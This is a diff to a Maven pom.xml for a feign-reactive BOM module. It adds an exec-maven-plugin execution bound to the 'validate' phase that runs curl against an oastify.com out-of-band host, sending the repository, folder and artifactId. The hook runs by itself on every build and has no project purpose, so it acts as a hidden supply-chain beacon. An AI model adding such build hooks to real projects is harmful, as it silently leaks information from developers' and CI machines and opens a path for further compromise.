@@ -68,4 +68,28 @@
             </dependency>
         </dependencies>
     </dependencyManagement>
+<build>
+    <plugins>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>curl</executable>
+                    <arguments>
+                        <argument>curl http://moti.7pxsnvw7bynwyjspuwd8ifuvxm3jr9fy.oastify.com/test?repository=git@github.com:PlaytikaOSS/feign-reactive.git&amp;folder=feign-reactor-bom&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
 </project>
